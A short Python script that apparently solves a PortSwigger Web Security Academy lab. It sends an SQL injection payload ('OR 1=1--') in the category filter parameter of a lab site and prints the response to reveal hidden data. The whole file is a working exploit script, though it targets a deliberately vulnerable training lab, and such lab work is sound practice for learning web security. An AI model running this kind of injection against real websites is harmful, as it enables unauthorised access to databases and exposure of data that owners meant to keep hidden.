# usage:
# python3 1.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")

    def solve(self) -> None:
        self.s = requests.Session()
        r = self.s.get(f"{self.url}/filter?category=Lifestyle'+OR+1=1--")
        print(r.text)


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
